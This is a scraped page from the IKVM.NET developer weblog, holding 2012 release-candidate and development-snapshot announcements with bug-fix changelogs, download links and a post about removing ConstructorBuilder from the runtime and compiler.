</div></div><div class="date"><h2 class="dateHeader">Wednesday, 31 October 2012</h2></div>
<div class="newsItems"><a name="afa8d4476-54cc-4274-a9d4-ccdae483a6da"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.2 Release Candidate 4</h3>
	<div class="entryBody">
		<P>Yet another release candidate.</P>
<P>Changes (relative to rc 3):</P>
<UL>
<LI>Updated version to 7.2.4630.4</LI>
<LI>Added (optional) support for building without System.Core.dll dependency.</LI>
<LI>Bug fix. Generate override stubs for unsupported abstract generic methods. Fix for #<A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3579785&amp;group_id=69637">3579785</A>.</LI>
<LI>Bug fix. Handle incomplete interface mappings. Fix for bug #<A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3581564&amp;group_id=69637">3581564</A>.</LI>
<LI>Bug fix. Verifier should not merge state from instruction following exception block to handler. Fix for bug #<A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3580611&amp;group_id=69637">3580611</A>.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4630.4.zip">ikvmbin-7.2.4630.4.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.2.4630.4.zip">ikvmsrc-7.2.4630.4.zip</A>, <A href="http://www.frijters.net/openjdk-7u6-b24-stripped.zip">openjdk-7u6-b24-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/31/2012 13:50:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fa8d4476-54cc-4274-a9d4-ccdae483a6da"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fa8d4476-54cc-4274-a9d4-ccdae483a6da">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 23 October 2012</h2></div>
<div class="newsItems"><a name="aa10406a6-0830-4bd2-beb4-ea64498f5358"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.2 Release Candidate 3</h3>
	<div class="entryBody">
		<P>The stream of release candidates seems to never end, but I really wanted to include the fix for bug <A href="http://sourceforge.net/tracker/?func=detail&amp;aid=3575555&amp;group_id=69637&amp;atid=525264">#3575555</A>. I also included some other low-risk fixes.</P>
<P>Changes (relative to rc 2):</P>
<UL>
<LI>Updated version to 7.2.4630.3 
<LI>Bug fix. Off-by-one error in JNI local ref index reusing. Fix for bug #3575555. 
<LI>Bug fix. Don't try to inject DynamicMethod in array types (applies to array.clone() method for MethodHandles). 
<LI>IKVM.Reflection: Bug fix. ModuleReader.ResolveMember() should support types. Thanks to Jb Evain for finding this. 
<LI>IKVM.Reflection: Bug fix. While reading the Mono.Cecil source I realized that array bounds are signed. 
<LI>IKVM.Reflection: Bug fix. LocalBuilder should extend LocalVariableInfo. 
<LI>IKVM.Reflection: Implemented LocalVariableInfo.ToString().</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4630.3.zip">ikvmbin-7.2.4630.3.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.2.4630.3.zip">ikvmsrc-7.2.4630.3.zip</A>, <A href="http://www.frijters.net/openjdk-7u6-b24-stripped.zip">openjdk-7u6-b24-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/23/2012 10:24:01 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=a10406a6-0830-4bd2-beb4-ea64498f5358"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=a10406a6-0830-4bd2-beb4-ea64498f5358">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 08 October 2012</h2></div>
<div class="newsItems"><a name="a8b39516b-019b-4d32-8c05-fcc1c8cff4a6"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.2 Release Candidate 2</h3>
	<div class="entryBody">
		<P>More bug fixes.</P>
<P>Changes (relative to rc 1):</P>
<UL>
<LI>Updated version to 7.2.4630.2</LI>
<LI>Bug fix. Class.forName("") should not throw System.ArgumentException.</LI>
<LI>Bug fix. Transient field modifier should be retained on literal fields.</LI>
<LI>Bug fix. Field.getModifiers() should only return the relevant modifiers.</LI>
<LI>IKVM.Reflection: Bug fix. Ignore unknown metadata streams.</LI>
<LI>IKVM.Reflection: Bug fix. Set AddressOfRawData in IMAGE_DEBUG_DIRECTORY.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4630.2.zip">ikvmbin-7.2.4630.2.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.2.4630.2.zip">ikvmsrc-7.2.4630.2.zip</A>, <A href="http://www.frijters.net/openjdk-7u6-b24-stripped.zip">openjdk-7u6-b24-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/08/2012 09:48:54 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8b39516b-019b-4d32-8c05-fcc1c8cff4a6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8b39516b-019b-4d32-8c05-fcc1c8cff4a6">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 03 October 2012</h2></div>
<div class="newsItems"><a name="afb90912d-27b4-487b-86b0-80bd3cc9fe64"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.46 Update 2 Release Candidate 1</h3>
	<div class="entryBody">
		<P>I forgot to include the fix for transient constant static final fields in the previous release candidate and a new bug was reported in how IKVM.Reflection writes the debug PE header that causes problems with Visual Studio 2012's code coverage tools.</P>
<P>Changes (relative to <A HREF="/PermaLink.aspx?guid=4ecbe4bb-de59-4d92-a46c-c0a750fedd27">0.46 Update 2 rc 0</A>):</P>
<UL>
<LI>Updated version to 0.46.0.4.</LI>
<LI>Fixed ikvmc to retain transient modifier on constant static final fields.</LI>
<LI>Fixed Field.getModifiers() to only return the relevant modifiers.</LI>
<LI>Fixed IKVM.Reflection to set AddressOfRawData in IMAGE_DEBUG_DIRECTORY.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.46.0.4.zip">ikvmbin-0.46.0.4.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.46.0.4.zip">ikvmsrc-0.46.0.4.zip</A>, <A href="http://www.frijters.net/openjdk6-b22-stripped.zip">openjdk6-b22-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/03/2012 08:26:59 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fb90912d-27b4-487b-86b0-80bd3cc9fe64"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fb90912d-27b4-487b-86b0-80bd3cc9fe64">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 27 September 2012</h2></div>
<div class="newsItems"><a name="a0671b43a-0054-4bfd-a56a-2f79b1bcfd8f"></a><div class="entry">
	<h3 class="entryTitle">Bye Bye ConstructorBuilder</h3>
	<div class="entryBody">
		<P>System.Reflection.Emit is a great .NET feature, especially if you consider that it shipped as part of .NET 1.0, but the design of System.Reflection.Emit leaves something to be desired.</P>
<P>One of the crazy features is ConstructorBuilder. On the System.Reflection side, ConstructorInfo isn't all that helpful, but it is not as actively harmful as ConstructorBuilder. The reason for this is that ConstructorInfo and MethodInfo both extend MethodBase, so most common APIs are available through MethodBase.</P>
<P>ConstructorBuilder and MethodBuilder share no common Builder base class (because they extend ConstructorInfo and MethodInfo), this causes a lot of code duplication and type testing/downcasting.</P>
<P>A long time ago I found out that you can mostly avoid ConstructorBuilder, since it is possible to use TypeBuilder.DefineMethod() to define constructors. Recently I finally got around to taking advantage of this and completely removing ConstructorBuiler from the IKVM.NET runtime and compiler.</P>
<P>The thing that pushed me over the edge was <A HREF="/PermaLink.aspx?guid=977499e8-0a70-4744-9482-5b6132504055">this experiment</A>. In .NET 2.0 there is no ConstructorBuilder equivalent to <A href="http://msdn.microsoft.com/en-us/library/system.reflection.emit.methodbuilder.createmethodbody.aspx">MethodBuilder.CreateMethodBody()</A>. So if I'm ever going to experiment with method level JIT it is nice to be able to use this more efficient method of installing the stub.</P>
<P>There is one problem with using MethodBuilder for constructors. If you define a custom attribute and want to apply that custom attribute while it is still unbaked, you need a ConstructorBuilder for the custom attribute constructor, because <A href="http://msdn.microsoft.com/en-us/library/3te85bew.aspx">CustomAttributeBuilder</A> requires it. Luckily, in dynamic mode IKVM doesn't need to do this and in static mode I use IKVM.Reflection so I added MethodInfo.__AsConstructorInfo() to wrap the MethodInfo in a ConstructorInfo.</P>
<P>I considered adding MethodInfo support to CustomAttributeBuilder, but that turned out to be much more complicated, so I went with the easy approach of reusing the existing wrapping strategy.</P>
<P>The result of this refactoring is the removal of a bunch of duplicate code and a lot of downcasting. It also saves a small bit of memory, because the ConstructorBuilder wrappers are not needed anymore.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/27/2012 14:29:05 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0671b43a-0054-4bfd-a56a-2f79b1bcfd8f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0671b43a-0054-4bfd-a56a-2f79b1bcfd8f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 26 September 2012</h2></div>
<div class="newsItems"><a name="a4ecbe4bb-de59-4d92-a46c-c0a750fedd27"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 0.46 Update 2 Release Candidate 0</h3>
	<div class="entryBody">
		<P>The 0.46 version is the last version based on Java 6 and as mentioned previously would be supported longer than a typical release. Based on user feedback I decided to post an update that fixes a number of bugs that have been found since the previous release.</P>
<P>Changes (relative to <A HREF="/PermaLink.aspx?guid=863d521d-a792-45a3-b32f-c323db25c2a4">0.46 Update 1</A>):</P>
<UL>
<LI>Updated version to 0.46.0.3.</LI>
<LI>Bug fix. java.lang.Package was not populated from manifest for ikvmc compiled assemblies.</LI>
<LI>Bug fix. When writing a direct ByteBuffer to a non-blocking socket and the write fails because there is no kernel buffer available, we should not advance the ByteBuffer position.</LI>
<LI>Bug fix. When adding certificates to virtual cacerts file make sure that the aliases are unique.</LI>
<LI>Bug fix. If a finally/fault handler contains reachable code before the handler's start index, the handler should branch to the handler start index.</LI>
<LI>Bug fix. After emitting a finally/fault handler block, we should emit the block leave stubs (even though you can't leave the block, they also emit the backward branch stubs).</LI>
<LI>Bug fix. If a Java class extends a remapped .NET type (cli.System.Object or cli.System.Exception), we should correctly report the base class.</LI>
<LI>Bug fix. If we encounter a jsr or ret instruction, we should throw a VerifyError (instead of NotImplementedException).</LI>
<LI>Bug fix. If an exception block ends with an astore, we need to propagate the local variable type after the astore to the exception handler.</LI>
<LI>Disable AppDomain.ProcessExit hook to run shutdown hooks when running on Mono to workaround https://bugzilla.xamarin.com/show_bug.cgi?id=5650</LI>
<LI>Bug fix. Custom attribute properties that don't have a public getter and setter should not be exposed as annotation properties.</LI>
<LI>Bug fix. Non-public property getter/setter methods should be ignored when we create properties to hide properties inherited from shadow types. This fixes a build break with .NET 4.5 beta which introduces a protected setter for Exception.HResult.</LI>
<LI>Bug fix. The $Method inner class for delegates should also be loadable for generic delegates. Thanks to Michael Bayne for reporting this.</LI>
<LI>Bug fix. When constructing a generic class loader we can't use GetWrapperFromType() on the type arguments, because they might refer to a subtype that is currently being loaded.</LI>
<LI>Replaced non-ascii character (micro) with ascii 'u' in Win32PrintService.java.</LI>
<LI>IKVM.Reflection: Bug fix. Resource Directory Entries must be sorted and names are case-insensitive.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.46.0.3.zip">ikvmbin-0.46.0.3.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-0.46.0.3.zip">ikvmsrc-0.46.0.3.zip</A>, <A href="http://www.frijters.net/openjdk6-b22-stripped.zip">openjdk6-b22-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/26/2012 08:16:30 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4ecbe4bb-de59-4d92-a46c-c0a750fedd27"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4ecbe4bb-de59-4d92-a46c-c0a750fedd27">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 17 September 2012</h2></div>
<div class="newsItems"><a name="a3812eb3e-2370-46e0-9037-e7d598d2a5cf"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.2 Release Candidate 1</h3>
	<div class="entryBody">
		<P>The previous release candidate had a regression that caused custom attributes specified in the remap xml file not to be applied. This caused&nbsp;the build to fail on .NET 4.0.</P>
<P>Changes (relative to rc 0):</P>
<UL>
<LI>Updated version to 7.2.4630.1</LI>
<LI>Fixed build number in CommonAssemblyInfo.cs.in.</LI>
<LI>Fixed .NET 4.0 build issues.</LI>
<LI>Fixed map.xml custom attribute application regression.</LI>
<LI>Updated HOWTO.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4630.1.zip">ikvmbin-7.2.4630.1.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.2.4630.1.zip">ikvmsrc-7.2.4630.1.zip</A>, <A href="http://www.frijters.net/openjdk-7u6-b24-stripped.zip">openjdk-7u6-b24-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/17/2012 13:39:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3812eb3e-2370-46e0-9037-e7d598d2a5cf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3812eb3e-2370-46e0-9037-e7d598d2a5cf">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 04 September 2012</h2></div>
<div class="newsItems"><a name="a82751f6b-6987-4b5c-b577-d5a6c95940f8"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.2 Release Candidate 0</h3>
	<div class="entryBody">
		<P>The first release candidate is available. Compared with the development snapshot some minor improvements to Object.getClass() and Class.getDeclaredField() instrinsics were made.</P>
<P>Changes (relative to <A HREF="/PermaLink.aspx?guid=c004201f-a226-4a98-8b12-904378e773d5">IKVM.NET 7.1</A>):</P>
<UL>
<LI>Integrated OpenJDK 7u6 b24.</LI>
<LI>Improved java.util.concurrent performance.</LI>
<LI>Removed org.omg.PortableInterceptor.UNKNOWN class, that is not part of [Open]JDK rt.jar. </LI>
<LI>Added ZipFile constructor that was added in Java 7.</LI>
<LI>Changed ikvmc to apply custom attribute annotations on annotation types to the corresponding custom attribute that is generated (and allow AttributeUsageAttribute to override the default AttributeUsageAttribute generated from the @Target annotation).</LI>
<LI>Added app.config files for executables to allow them to run on .NET 4.5 on Windows 8 without triggering the .NET 3.5 auto download.</LI>
<LI>Bug fixes.</LI>
<LI>Many IKVM.Reflection improvements.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4630.0.zip">ikvmbin-7.2.4630.0.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.2.4630.0.zip">ikvmsrc-7.2.4630.0.zip</A>, <A href="http://www.frijters.net/openjdk-7u6-b24-stripped.zip">openjdk-7u6-b24-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/04/2012 15:39:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=82751f6b-6987-4b5c-b577-d5a6c95940f8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=82751f6b-6987-4b5c-b577-d5a6c95940f8">Comments [5]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 31 August 2012</h2></div>
<div class="newsItems"><a name="a47a14d1f-144d-4793-8fab-4f6b6fcd0da4"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've integrated OpenJDK 7u6. The 7u7 security update is not included (as IKVM.NET is not suitable for running untrusted Java code anyway).</P>
<P>One divergence from 7u6 of note is that the new string hashing (used to protect against DoS attacks by intentionally causing hash collisions) has not been implemented. Instead the .NET String.GetHashCode() method is used for the alternative hash code. If DoS protection is required, .NET 4.5 should be used and <A href="http://msdn.microsoft.com/en-us/library/jj152924.aspx">randomized string hashing</A> should be enabled.</P>
<P>Next stop the release candidate.</P>
<P>Changes:</P>
<UL>
<LI>Merged OpenJDK 7u6 b24.</LI>
<LI>Add support for running with headless awt toolkit. Fix for #3552089.</LI>
<LI>Fix a ClassCastException in printerJob.defaultPage() if the default paper format is not a standard paper format. This can occur with label printer. </LI>
<LI>Stop using ConstructorBuilder (always use MethodBuilder).</LI>
<LI>Remove usage of AssemblyName.ReferenceMatchesDefinition() because it is broken on .NET and not implemented on Mono.</LI>
<LI>Apply custom attribute annotations on annotation types to the corresponding custom attribute that is generated (and allow AttributeUsageAttribute to override the default AttributeUsageAttribute generated from the @Target annotation).</LI>
<LI>Fixed InternalsVisibleToAttribute handling to take the public key into account as well.</LI>
<LI>Win32 print service fixes.</LI>
<LI>Optimized String.valueOf(char).</LI>
<LI>Add app.config files for executables to allow them to run on .NET 4.5 on Windows 8 without triggering the .NET 3.5 auto download.</LI>
<LI>Fix Window.setIconImages(). Now all images are used. Before only the first image was used.</LI>
<LI>Disallow Unsafe.getUnsafe() from being called via reflection (for JDK compatibility).</LI>
<LI>Merged in security manager check to Font.createFont(int, File) from OpenJDK.</LI>
<LI>IKVM.Reflection: Bug fix. When enumerating virtual methods, we should only skip match actual base methods, not any method with the same signature.</LI>
<LI>IKVM.Reflection: Automatically add default constructor when necessary (using the same criteria as Ref.Emit).</LI>
<LI>IKVM.Reflection: Added API extension to wrap MethodInfo in a ConstructorInfo.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4626.zip">ikvmbin-7.2.4626.zip</A></P>
<P>The stripped OpenJDK 7u6 b24 sources are available here: <A href="http://www.frijters.net/openjdk-7u6-b24-stripped.zip">openjdk-7u6-b24-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/31/2012 13:43:50 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=47a14d1f-144d-4793-8fab-4f6b6fcd0da4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=47a14d1f-144d-4793-8fab-4f6b6fcd0da4">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 24 July 2012</h2></div>
<div class="newsItems"><a name="a7b000e60-9685-452b-8186-a07e4dc8d858"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I did some bytecode fuzzing and found and fixed a number of obscure bugs. Also fixed the bug reported <A HREF="/CommentView.aspx?guid=eeba74ea-0252-459b-8c67-2178d938ac32">here</A>.</P>
<P>Changes:</P>
<UL>
<LI>Bug fix. If we encounter an invokedynamic in a method that has a jsr (which is always invalid because of class version rules), we need to throw a VerifyError.</LI>
<LI>Bug fix. If we encounter a jsr or ret instruction, we should throw a VerifyError (instead of NotImplementedException).</LI>
<LI>Bug fix. If a bytecode instruction refers to an invalid constant pool entry, MarkLinkRequiredConstantPoolItem should not throw an exception, but simply ignore the mark, the incorrect bytecode will be reported later during verification.</LI>
<LI>Bug fix. It is not valid to call TypeWrapper.IsInterfaceOrInterfaceArray on an UnloadableTypeWrapper.</LI>
<LI>Bug fix. There was a logic error in FindBaseMethods7() that caused LinkAndGetMethod() to be called if TryGetClassFileVersion() succeeded and the class version was greater than or equal to 51.</LI>
<LI>Bug fix. If a Java class extends a remapped .NET type (cli.System.Object or cli.System.Exception), we should correctly report the base class.</LI>
<LI>Bug fix. If a finally/fault handler contains reachable code before the handler's start index, the handler should branch to the handler start index.</LI>
<LI>Bug fix. After emitting a finally/fault handler block, we should emit the block leave stubs (even though you can't leave the block, they also emit the backward branch stubs).</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4587.zip">ikvmbin-7.2.4587.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/24/2012 08:12:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7b000e60-9685-452b-8186-a07e4dc8d858"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7b000e60-9685-452b-8186-a07e4dc8d858">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 18 July 2012</h2></div>
<div class="newsItems"><a name="aeeba74ea-0252-459b-8c67-2178d938ac32"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've been working on IKVM.Reflection to fix some loose ends and add support for various .NET 4.5 features. I also managed to squeeze in some bug fixes for IKVM.NET itself and some improvements to the (experimental and disabled by default) MSIL optimizer. Finally, I added intrinsics for some sun.misc.Unsafe operations to make some of the java.util.concurrent classes more efficient.</P>
<P>Changes:</P>
<UL>
<LI>Bug fix. The interface fields exposed in the __Fields nested type should have a public field type.</LI>
<LI>Interface fields can always be marked as initonly and don't need final access stubs.</LI>
<LI>Disable AppDomain.ProcessExit hook to run shutdown hooks when running on Mono to workaround https://bugzilla.xamarin.com/show_bug.cgi?id=5650</LI>
<LI>Changed NoClassDefFoundError resulting from type initialization failure to be consistent with OpenJDK behavior.</LI>
<LI>Many improvements to the (disabled) MSIL optimizer.</LI>
<LI>Added intrinsics for (some usages of) Unsafe methods: putObject, putOrderedObject, putObjectVolatile, getObjectVolatile, getObject, compareAndSwapObject.</LI>
<LI>Marked String.compareTo(Object) as bridge method.</LI>
<LI>Remove org.omg.PortableInterceptor.UNKNOWN class, that is not part of [Open]JDK rt.jar.</LI>
<LI>Add ZipFile constructor that was added in Java 7.</LI>
<LI>Deprecated the ikvmstub -serialver option and added a -japi option instead that also adds non-public interfaces and members. Also added a hack to fix the fact that String instance methods were all marked as deprecated.</LI>
<LI>Internal stub generator now reproduces exact class modifier bits.</LI>
<LI>Unused class modifier bits are now properly masked and returned.</LI>
<LI>Non-abstract interfaces now properly return ACC_ABSTRACT modifier.</LI>
<LI>IKVM.Reflection: Added .NET 4.5 ModuleBuilder APIs GetMethodToken(MethodInfo, IEnumerable<TYPE>) and GetConstructorToken(MethodInfo, IEnumerable<TYPE>).</LI>
<LI>IKVM.Reflection: Added API extensions ModuleBuilder.__GetMethodToken() and ModuleBuilder.__GetConstructorToken().</LI>
<LI>IKVM.Reflection: Bug fix. SignatureHelper.AddArguments() should accept a null reference for arguments parameter.</LI>
<LI>IKVM.Reflection: Bug fix. SignatureHelper.GetMethodSigHelper(Module, Type, Type[]) should accept null reference for parameterTypes argument.</LI>
<LI>IKVM.Reflection: Bug fix. SignatureHelper.AddArguments(Type[], Type[][], Type[][]) should accept null references for requiredCustomModifiers and optionalCustomModifiers.</LI>
<LI>IKVM.Reflection: Bug fix. SignatureHelper.AddSentinel() should not affect the calling convention.</LI>
<LI>IKVM.Reflection: Simplified SignatureHelper implementation to make it more compatible with .NET and more efficient.</LI>
<LI>IKVM.Reflection: Added .NET 4.5 AssemblyName.ContentType property and ContentType=WindowsRuntime in AssemblyName.</LI>
<LI>IKVM.Reflection: Bug fix. ModuleBuilder.ResolveMethod() should return ConstructorInfo for constructors.</LI>
<LI>IKVM.Reflection: Made MethodSpec handling more consistent with MemberRef handling. This avoids the need for the caching the MethodInfo to token mappings (which leaks memory, because generic method instances are not canonicalized).</LI>
<LI>IKVM.Reflection: Removed unnecessary (and memory leaking) member ref caching level.</LI>
<LI>IKVM.Reflection: Explicitly disallow modifying a method signature after it has been used.</LI>
<LI>IKVM.Reflection: Added experimental support for generating Windows Runtime (.winmd) assemblies.</LI>
<LI>IKVM.Reflection: Added missing DefineResource() APIs to ModuleBuilder and AssemblyBuilder.</LI>
<LI>IKVM.Reflection: Fixed regression. Type.GetConstructor() should also return the class constructor. This also fixes Type.TypeInitializer.</LI>
<LI>IKVM.Reflection: Updated Assembly.CreateQualifiedName() to be compatible with current .NET versions.</LI>
<LI>IKVM.Reflection: Added new .NET 4.5 API Type.IsConstructedGenericType.</LI>
<LI>IKVM.Reflection: Added co-/contra-variance support to Type.IsAssignableFrom().</LI>
<LI>IKVM.Reflection: Added support for using the .NETCore v4.5 aka Metro profile mscorlib.dll.</LI>
<LI>IKVM.Reflection: Ignore HasFieldMarshal attribute and always return the pseudo custom attribute if a FieldMarshal record exists. This is similar to .NET reflection.</LI>
<LI>IKVM.Reflection: If a FieldLayout record exists, always return the pseudo custom attribute FieldOffset, regardless of the declaring type's layout.</LI>
<LI>IKVM.Reflection: Added new API [Field|Parameter]Info.__TryGetFieldMarshal().</LI>
<LI>IKVM.Reflection: Added new API FieldInfo.__TryGetFieldOffset().</LI>
<LI>IKVM.Reflection: Keep track of whether a ModuleBuilder has been saved (and only allow it to be saved once).</LI>
<LI>IKVM.Reflection: Fixed various builders to throw NotImplementedException (like .NET) when getting custom attributes before the type has been baked.</LI>
<LI>IKVM.Reflection: Fixed various builders to properly return custom attributes after the module has been saved.</LI>
<LI>IKVM.Reflection: Bug fix. FieldBuilder.GetRawConstantValue() didn't work after saving the module.</LI>
<LI>IKVM.Reflection: Bug fix. MethodInfo should return PreserveSigAttribute pseudo custom attribute if MethodImplAttributes.PreserveSig is set.</LI>
<LI>IKVM.Reflection: Added new API MethodInfo.__TryGetImplMap().</LI>
<LI>IKVM.Reflection: Changed DllImportAttribute synthesis to always include CharSet, BestFitMapping and ThrowOnUnmappableChar to be compatible with .NET. Now that we have __TryGetImplMap() we don't need to distinguish anymore between not set and set to the default value.</LI>
<LI>IKVM.Reflection: Added .NET 4.5 API CustomAttributeData.AttributeType property.</LI>
<LI>IKVM.Reflection: Made MarshalAsAttribute synthesis more compatible with .NET by always setting ArraySubType, SizeParamIndex, SizeConst and SafeArraySubType properties.</LI>
<LI>IKVM.Reflection: Made CustomAttributeData.ToString() output more compatible with .NET (by "casting" enum values, except zero).</LI>
<LI>IKVM.Reflection: Fixed MarshalAsAttribute values. Use enum underlying values, instead of the enum values.</LI>
<LI>IKVM.Reflection: Added UniverseOptions.DisablePseudoCustomAttributeRetrieval to disable returning pseudo custom attributes.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.2.4582.zip">ikvmbin-7.2.4582.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/18/2012 08:35:08 (W. Europe Daylight Time, UTC+02:00)&nbsp;
